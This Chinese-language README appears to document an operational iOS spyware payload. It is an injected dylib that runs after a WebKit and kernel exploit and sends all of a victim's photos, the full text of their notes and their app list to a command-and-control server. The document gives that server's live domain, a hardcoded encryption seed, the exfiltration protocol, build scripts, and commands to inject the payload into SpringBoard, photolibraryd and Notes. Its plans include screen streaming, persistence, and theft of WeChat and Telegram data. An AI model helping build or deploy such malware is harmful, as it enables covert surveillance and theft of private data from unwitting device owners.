# 自研 C2 载荷（iOS 15/16）

纯自研 ObjC dylib，编译后注入目标进程，替代第三方的 `new.js` / `helion.js` 等载荷。
**不改 exploit 层**（`qqtime/*.js` 那套 WebKit + 内核提权照旧用它），只替换「拿到代码执行之后干什么」。

目录按**多载荷**组织：`common/` 放共用代码，每个载荷一个自己的文件夹，编译时自动合并。

---

## 目录

```
dylib/
├── common/                    共用（所有载荷都会编进去）
│   ├── Crypto.m/h             AES-256-ECB + SHA256，与服务器 crypto.py 一致
│   ├── Net.m/h                /event 加密上报 + /t multipart + /taskget /taskresult
│   └── Info.m/h               UDID / ECID / 序列号 / 机型 / 系统版本
│
├── photonote/                 载荷①：采集（照片 + 备忘录 + app 列表 + 开 App）
│   ├── Payload.m              入口 + 主循环
│   └── Collector.m/h          采集能力
│
├── tools/
│   ├── pack.py                dylib → 7z → xxx.js，算 sha256/size
│   └── update_show.py         挂进 show.html 的 entries
│
├── .github/workflows/build.yml    自动发现所有载荷目录，矩阵编译
├── build.sh                       本地构建：./build.sh photonote
└── README.md
```

### 加新载荷

```
dylib/
├── screenstream/           ← 新建目录，放 *.m
│   └── Payload.m
├── common/                 ← 复用，不用改
```

`./build.sh screenstream` 或推 GitHub（workflow 会自动发现含 `*.m` 的目录）。

---

## photonote 的能力（和原来 payload 的差别）

| 能力 | 原 payload | photonote |
|---|---|---|
| app 列表 | ✓ | ✓ 每次全量 |
| 相册 | 一个周期传 1 张 | **一次循环把全部照片传完** |
| 备忘录 | 只回前 8 条预览 | **直读 NoteStore.sqlite，全量正文** |
| 打开 App | 收到任务不执行 | **`LSApplicationWorkspace` 直接拉起** |
| 采集频率 | 受 show.html 的 60/120s 限制 | 代码里自己定（默认 20s 一轮） |
| 源码 | 无 | 全在 `photonote/` |

---

## 协议（已和现有服务端完全对齐）

**上报 `/event`**

```
POST /event
x-ts: <毫秒时间戳>
Content-Type: application/json
body: base64( AES-256-ECB( "<x-ts><json>", key=SHA256("Ek8pl31K2yeHgQwy" + x-ts) ) )
```

响应里带 `tasks`，就是采集指令：

```json
{"msg":"OK","code":200,"tasks":[{"action":"collect_applist"},{"action":"collect_photo"}]}
```

**上传照片 `/t`**

```
POST /t   multipart/form-data
字段: u / d / s / lhu / m / b / idx / ftu / rid / ts
file: 明文 JPEG 即可（服务端会 sniff 魔数，不需要 .dat 的 32B头+7z 封装）
```

**任务轮询 `/taskget`** → `{tasks:[{id,type,params,timeout}]}`
**任务回执 `/taskresult`** → `{did, taskId, status, result, duration}`

---

## 编译

### GitHub Actions（不需要 Mac）

1. 推到 GitHub 仓库
2. Actions → `build-payload` → Run workflow（`target` 填 `photonote`）
3. 下载 artifact `dylib-photonote`

推送时改了 `common/**` 或某个载荷目录，会自动发现并矩阵编译所有载荷。

### 本地 macOS

```bash
cd dylib
chmod +x build.sh
./build.sh photonote
# 产物: out/photonote.dylib
```

---

## 部署

**① 改两个常量**

`photonote/Payload.m` 顶部：

```objc
static NSString *const kBaseURL     = @"http://myg3z1adawtxz0s.icu";
static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";
```

**② 打包**

```bash
python tools/pack.py out/photonote.dylib photonote --deploy
```

会打印 sha256 / size —— 这是 `show.html` 校验用的**解开后 dylib** 的值，不是 .js 的。

**③ 挂进 show.html**

```bash
# 看现有 entries
python tools/update_show.py --list

# 把 SpringBoard / 相册 / 备忘录三条换成我们的
python tools/update_show.py --bundle com.apple.springboard   --name photonote --dylib out/photonote.dylib
python tools/update_show.py --bundle com.apple.photolibraryd --name photonote --dylib out/photonote.dylib
python tools/update_show.py --bundle com.apple.notes         --name photonote --dylib out/photonote.dylib
```

脚本会自动备份、重打包、自校验。**在副本上试**：

```bash
SHOW_HTML=/tmp/copy.html python tools/update_show.py --bundle ... 
```

**④ 让设备重新拉配置**

设备每 60s 重新 GET `show.html`，但 payload 按 URL 缓存已解析的配置，
所以要换 URL 才触发重新解析 —— `pack.py` 时换个 `--name`（如 `photonote2`）即可。

---

## 验证

```sql
-- 设备
SELECT id, uuid, machine, ios_version, app_count, photo_count, note_count FROM devices;

-- 采集事件
SELECT channel, JSON_UNQUOTE(JSON_EXTRACT(decoded_json,'$.et')) et, created_at
FROM events ORDER BY id DESC LIMIT 20;

-- 照片 / 备忘录
SELECT id, device_id, filename, bytes FROM device_photos ORDER BY id DESC LIMIT 10;
SELECT device_id, left(title,40), left(snippet,60) FROM device_notes ORDER BY id DESC LIMIT 10;
```

服务端日志应该有：

```
[Nest] LOG [C2Http] 相册解密成功 xxx.jpg → image/jpeg (xxxxB)
```

---

## 已知限制

- **注入进程必须活着**：iOS 会挂起后台进程，进程一死注入就没了。做持久化要写 launchd plist。
- **PHAsset 需要相册权限**：注入进程弹不出授权框，`Collector.m` 里已带 DCIM 目录兜底扫描。
- **备忘录路径**：`/var/mobile/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`，
  不同 iOS 版本可能变，代码里列了三个候选路径。
- **`lhu` 会变**：`Info.m` 用 UDID 哈希生成设备 UUID（系统进程里拿不到 `identifierForVendor`），
  所以设备会在面板里注册成新设备。
- **arm64e**：个别 SDK 版本 clang 会拒绝，脚本里做了降级。

---

## 下一步

- [ ] `screenstream/`：注入 SpringBoard，`CARenderServerRenderDisplay` → IOSurface → VideoToolbox H.264 → WebSocket 实时串流
- [ ] launchd 持久化
- [ ] 微信 / Telegram 本地库导出
